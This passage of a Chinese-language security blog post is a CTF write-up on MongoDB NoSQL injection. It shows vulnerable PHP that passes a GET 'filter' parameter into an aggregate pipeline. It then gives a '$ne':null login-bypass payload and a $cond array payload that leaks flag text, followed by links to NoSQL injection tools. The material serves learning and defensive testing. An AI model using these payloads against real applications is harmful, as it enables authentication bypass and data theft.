by</span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$category&quot;&gt;category&lt;&#x2F;a&gt; | </span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$public&quot;&gt;publicity&lt;&#x2F;a&gt;&lt;br&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">        $filter &#x3D; $_GET[&#39;filter&#39;];</span><br><span class="line"></span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline &#x3D; [</span><br><span class="line">            [&#39;$group&#39; &#x3D;&gt; [&#39;_id&#39; &#x3D;&gt; &#39;$category&#39;, &#39;count&#39; &#x3D;&gt; [&#39;$sum&#39; &#x3D;&gt; 1]]],</span><br><span class="line">            [&#39;$sort&#39; &#x3D;&gt; [&#39;count&#39; &#x3D;&gt; -1]],</span><br><span class="line">            [&#39;$limit&#39; &#x3D;&gt; 5],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters &#x3D; [</span><br><span class="line">            [&#39;$project&#39; &#x3D;&gt; [&#39;category&#39; &#x3D;&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor &#x3D; $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($filter)): ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">            foreach ($cursor as $category) &#123;</span><br><span class="line">                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&#39;_id&#39;], $category[&#39;count&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php else: ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])): ?&gt;</span><br><span class="line">        Invalid username or password</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action&#x3D;&#39;&#x2F;&#39; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line">        $cursor &#x3D; $collection-&gt;find([&#39;public&#39; &#x3D;&gt; 1]);</span><br><span class="line">        foreach ($cursor as $news) &#123;</span><br><span class="line">            printf(&quot;%s&lt;br&gt;&quot;, $news[&#39;title&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php endif; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>第一步是利用重言式注入登录，但是有点不同的是，输入的参数被双引号包括，所以我们必须想办法闭合这个双引号，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;&#x3D;null&#125;, &quot;username&quot;:admin&quot;</span><br></pre></td></tr></table></figure>
+<p>这里如果直接使用<code>&#123;&quot;$ne&quot;:null&#125;</code>会出现500的错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">代码：</span><br><span class="line">var_dump(json_decode($raw_query));</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">object(stdClass)#1 (2) &#123;</span><br><span class="line">  [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现<code>&#123;'$ne':null&#125;</code>被解析成了string而不是array。前一个payload虽然<code>username</code>和<code>password</code>重复了，但<code>json_decode</code>时变量只会是最后一次的赋值。</p>
+<p>登录成功后</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105403.png" alt=""></p>
+<p>filter参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条。</p>
+<p>代码里是用的MongoDB聚合函数<code>aggregate</code>，下面这张图也是来自官方文档解释了<code>aggregate</code>函数的执行过程：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105017.png" alt=""></p>
+<p>使用<code>aggregate</code>聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中<code>$cond</code>表示if判断语句，匹配的符号使用<code>$eq</code>，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。</p>
+<p>官方文档列出的<code>$cond</code>的用法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317113708.png" alt=""></p>
+<p><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/">官方文档的例子</a>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">db.inventory.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             item: 1,</span><br><span class="line">             discount:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>现在我们的目的是：如果<code>$category</code>的值是flag，那么就输出<code>$title</code>的内容，否则还是原样输出<code>$catagory</code>，照着上面的例子写成MongoDB shell的形式就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">db.news.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             category:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>转换成PHP数组形式传入filter参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filter[$cond][if][$eq][]&#x3D;flags&amp;filter[$cond][if][$eq][]&#x3D;$category&amp;filter[$cond][then]&#x3D;$title&amp;filter[$cond][else]&#x3D;$category</span><br></pre></td></tr></table></figure>
+<p>转换成<code>raw_query</code>的形式：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;category&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="attr">&quot;$cond&quot;</span>:</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="attr">&quot;if&quot;</span>:</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">&quot;$eq&quot;</span>: [ <span class="string">&quot;$category&quot;</span>, <span class="string">&quot;flags&quot;</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;then&quot;</span>: <span class="string">&quot;$title&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;else&quot;</span>: <span class="string">&quot;$category&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>var_dump(json_decode(raw_query))</code>即为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">object(stdClass)#4 (1) &#123;</span><br><span class="line">  [&quot;category&quot;]&#x3D;&gt;</span><br><span class="line">  object(stdClass)#3 (1) &#123;</span><br><span class="line">    [&quot;$cond&quot;]&#x3D;&gt;</span><br><span class="line">    object(stdClass)#2 (3) &#123;</span><br><span class="line">      [&quot;if&quot;]&#x3D;&gt;</span><br><span class="line">      object(stdClass)#1 (1) &#123;</span><br><span class="line">        [&quot;$eq&quot;]&#x3D;&gt;</span><br><span class="line">        array(2) &#123;</span><br><span class="line">          [0]&#x3D;&gt;</span><br><span class="line">          string(9) &quot;$category&quot;</span><br><span class="line">          [1]&#x3D;&gt;</span><br><span class="line">          string(5) &quot;flags&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      [&quot;then&quot;]&#x3D;&gt;</span><br><span class="line">      string(6) &quot;$title&quot;</span><br><span class="line">      [&quot;else&quot;]&#x3D;&gt;</span><br><span class="line">      string(9) &quot;$category&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131510.png" alt=""></p>
+<p>接着直接修改<code>$title</code>为<code>$text</code>查看：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131619.png" alt=""></p>
+<p>成功拿到flag~</p>
+<h3 id="HTB-Mongo">HTB Mongo</h3>
+<p>最近做了一个HackTheBox的靶机，主要考察的就是写脚本盲注MongoDB，限于篇幅原因，就不把walkthrough贴在这里了，感兴趣的同学可以<a href="https://ca0y1h.top/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/">移步于此</a>。</p>
+<h2 id="0x06-工具">0x06 工具</h2>
+<p>Github上有个叫<a target="_blank" rel="noopener" href="https://github.com/youngyangyang04/NoSQLAttack">NoSQLAttack</a>工具，不过已经没有维护了。</p>
+<p>另外还有一个<a target="_blank" rel="noopener" href="https://github.com/codingo/NoSQLMap">NoSQLMap</a>工具，这个项目作者仍在维护。</p>
+<h2 id="0x07-参考资料">0x07 参考资料</h2>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/">https://www.runoob.com/mongodb/</a></p>
+<p><a target="_blank" rel="noopener" href="https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0">https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x03-NoSQL%E6%B3%A8%E5%85%A5">https://www.mi1k7ea.com/2019/08/11/NoSQL注入之MongoDB/#0x03-NoSQL注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB注入指北/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zanon.io/posts/nosql-injection-in-mongodb">https://zanon.io/posts/nosql-injection-in-mongodb</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-03-17</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>-><a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/NoSQL%E6%B3%A8%E5%85%A5/" rel="tag">#NoSQL注入</a> <a class="tag-none-link" href="/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">#Web安全学习</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
